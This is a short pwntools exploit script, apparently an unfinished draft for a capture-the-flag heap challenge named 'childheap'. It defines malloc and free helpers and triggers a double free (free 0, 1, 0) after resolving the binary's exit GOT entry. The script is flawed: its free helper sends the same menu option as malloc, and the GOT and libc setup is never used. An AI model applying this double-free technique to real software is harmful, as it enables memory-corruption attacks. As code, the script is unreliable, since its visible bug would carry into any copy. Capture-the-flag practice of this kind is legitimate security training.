#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = remote("ctf.j0n9hyun.xyz", 3033)
p = process("./childheap")
libc = ELF("./libc.so.6")
elf = ELF("./childheap")
exit_got = elf.got['exit']

def malloc(index, size, content):
    p.sendlineafter("> ", '1')
    p.sendlineafter("index: ", str(index))
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", content)

def free(index):
    p.sendlineafter("> ", '1')
    p.sendafter("index: ", str(index))

gdb.attach(p)

malloc(0, 0x10, 'A'*0x10)
malloc(1, 0x10, 'B'*0x10)

free(0)
free(1)
free(0)

p.interactive()
